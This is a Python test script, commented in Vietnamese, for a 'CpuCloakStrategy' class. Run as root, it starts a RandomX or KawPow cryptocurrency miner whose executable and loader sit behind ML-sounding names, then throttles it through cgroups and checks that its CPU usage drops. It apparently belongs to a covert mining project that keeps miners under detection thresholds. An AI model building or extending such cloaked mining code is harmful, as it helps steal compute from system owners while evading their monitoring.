# test_cpu_cloak_strategy.py

import logging
import time
import psutil
import subprocess
import os
import traceback
from typing import Dict, Any, List, Tuple, Optional, Type  # Thêm Type ở đây

from mining_environment.scripts.cloak_strategies import CpuCloakStrategy


def setup_logging() -> logging.Logger:
    """
    Thiết lập logger để ghi log vào console với mức độ DEBUG.
    """
    logger = logging.getLogger("RuntimeIntegrationTest")
    logger.setLevel(logging.DEBUG)

    handler = logging.StreamHandler()
    handler.setLevel(logging.DEBUG)
    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)

    return logger


def start_mining_process(cpu=True, retries=3, delay=5, logger=None):
    """
    Khởi động quá trình khai thác CPU/GPU với cơ chế thử lại.

    Args:
        cpu (bool): Nếu True, khai thác CPU; ngược lại, khai thác GPU.
        retries (int): Số lần thử khởi động lại nếu khởi động thất bại.
        delay (int): Thời gian (giây) giữa các lần thử lại.
        logger (logging.Logger): Logger để ghi log.

    Returns:
        subprocess.Popen: Đối tượng tiến trình khai thác nếu thành công, None nếu thất bại.
    """
    if logger is None:
        logger = logging.getLogger("RuntimeIntegrationTest")

    executable = os.getenv('ML_COMMAND' if cpu else 'CUDA_COMMAND')
    if not executable:
        logger.error(f"Biến môi trường {'ML_COMMAND' if cpu else 'CUDA_COMMAND'} không được thiết lập.")
        return None

    if not os.path.isfile(executable) or not os.access(executable, os.X_OK):
        logger.error(f"Tệp thực thi khai thác không hợp lệ hoặc không có quyền: {executable}")
        return None

    mining_server = os.getenv('MINING_SERVER_CPU' if cpu else 'MINING_SERVER_GPU')
    mining_wallet = os.getenv('MINING_WALLET_CPU' if cpu else 'MINING_WALLET_GPU')
    if not mining_server or not mining_wallet:
        logger.error("Biến môi trường MINING_SERVER hoặc MINING_WALLET không được thiết lập.")
        return None

    mining_command = [
        executable,
        '-o', mining_server,
        '-u', mining_wallet,
        '--tls'
    ]
    if cpu:
        mining_command.extend(['-a', 'rx/0', '--no-huge-pages'])
    else:
        cuda_loader = os.getenv('MLLS_CUDA', '/usr/local/bin/libmlls-cuda.so')
        mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])

    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'} (Lần {attempt}/{retries})...")
        try:
            process = subprocess.Popen(
                mining_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            logger.info(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} đã được khởi động với PID: {process.pid}")
            time.sleep(2)
            if process.poll() is None:
                return process
            else:
                logger.warning(f"Tiến trình PID {process.pid} đã kết thúc không mong muốn.")
        except Exception as e:
            logger.error(f"Lỗi khi khởi động quá trình khai thác {'CPU' if cpu else 'GPU'}: {e}")
        if attempt < retries:
            logger.info(f"Đợi {delay} giây trước khi thử lại...")
            time.sleep(delay)

    logger.error(f"Không thể khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'}.")
    return None


def monitor_cpu_usage(pid: int, interval: int = 1, duration: int = 10, logger: Optional[logging.Logger] = None) -> List[float]:
    """
    Giám sát mức sử dụng CPU của một tiến trình trong một khoảng thời gian nhất định.

    Args:
        pid (int): PID của tiến trình.
        interval (int): Khoảng thời gian giữa các lần đo (giây).
        duration (int): Tổng thời gian giám sát (giây).
        logger (Optional[logging.Logger]): Logger để ghi log.

    Returns:
        List[float]: Danh sách các mức sử dụng CPU (%).
    """
    usage = []
    if logger is None:
        logger = logging.getLogger("RuntimeIntegrationTest")
    try:
        process = psutil.Process(pid)
        for _ in range(duration):
            cpu = process.cpu_percent(interval=interval)
            usage.append(cpu)
            logger.debug(f"PID {pid} CPU usage: {cpu}%")
    except psutil.NoSuchProcess:
        logger.warning(f"Tiến trình với PID {pid} đã kết thúc.")
    except Exception as e:
        logger.error(f"Lỗi khi giám sát CPU usage cho PID {pid}: {e}")
    return usage


def cleanup_cgroups(cpu_cloak_strategy, logger):
    """
    Xóa cgroups đã được tạo bởi CpuCloakStrategy.

    Args:
        cpu_cloak_strategy (CpuCloakStrategy): Đối tượng CpuCloakStrategy đã được khởi tạo.
        logger (logging.Logger): Logger để ghi log.
    """
    try:
        cpu_cloak_strategy.cleanup_cgroups()
        logger.info("Đã dọn dẹp tất cả các cgroup liên quan.")
    except Exception as e:
        logger.error(f"Lỗi khi dọn dẹp cgroups: {e}")


def main():
    """
    Hàm chính để thực hiện Runtime Integration Test cho lớp CpuCloakStrategy.
    """
    logger = setup_logging()

    # Cấu hình cho CpuCloakStrategy
    config = {
        'throttle_percentage': 20,  # Giảm 20% sử dụng CPU
        'cpu_shares': 1024           # Mức độ ưu tiên CPU
    }

    cpu_cloak_strategy = CpuCloakStrategy(config, logger)

    # Khởi chạy tiến trình khai thác CPU hoặc GPU
    mining_process = start_mining_process(cpu=True, retries=3, delay=5, logger=logger)
    if not mining_process:
        logger.error("Không thể khởi động tiến trình khai thác. Kết thúc kiểm thử.")
        return

    try:
        # Giám sát CPU usage trước khi áp dụng chiến lược
        logger.info("Bắt đầu giám sát CPU usage trước khi áp dụng chiến lược...")
        pre_throttle_usage = monitor_cpu_usage(
            pid=mining_process.pid,
            interval=1,
            duration=10,
            logger=logger
        )
        logger.info(f"CPU usage trước throttling: {pre_throttle_usage}")

        # Áp dụng chiến lược throttling CPU
        adjustments = cpu_cloak_strategy.apply(mining_process)
        logger.info(f"Các điều chỉnh đã áp dụng: {adjustments}")

        # Giám sát CPU usage sau khi áp dụng chiến lược
        logger.info("Bắt đầu giám sát CPU usage sau khi áp dụng chiến lược...")
        post_throttle_usage = monitor_cpu_usage(
            pid=mining_process.pid,
            interval=1,
            duration=10,
            logger=logger
        )
        logger.info(f"CPU usage sau throttling: {post_throttle_usage}")

        # So sánh mức sử dụng CPU
        if pre_throttle_usage and post_throttle_usage:
            avg_pre = sum(pre_throttle_usage) / len(pre_throttle_usage)
            avg_post = sum(post_throttle_usage) / len(post_throttle_usage)
            logger.info(f"Trung bình CPU usage trước throttling: {avg_pre}%")
            logger.info(f"Trung bình CPU usage sau throttling: {avg_post}%")
            if avg_post < avg_pre:
                logger.info("Throttling CPU thành công: CPU usage đã giảm.")
            else:
                logger.warning("Throttling CPU không hiệu quả: CPU usage không giảm.")
    except Exception as e:
        logger.error(f"Lỗi trong quá trình kiểm thử: {e}\n{traceback.format_exc()}")
    finally:
        logger.info(f"Đang dừng tiến trình khai thác PID {mining_process.pid}...")
        mining_process.terminate()
        try:
            mining_process.wait(timeout=5)
            logger.info(f"Tiến trình PID {mining_process.pid} đã dừng.")
        except subprocess.TimeoutExpired:
            logger.warning(f"Tiến trình PID {mining_process.pid} không dừng theo yêu cầu. Đang buộc dừng...")
            mining_process.kill()
            logger.info(f"Tiến trình PID {mining_process.pid} đã bị buộc dừng.")

        # Dọn dẹp các cgroup đã tạo
        cleanup_cgroups(cpu_cloak_strategy, logger)


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Bạn cần chạy script này với quyền root (sudo).")
        exit(1)
    main()
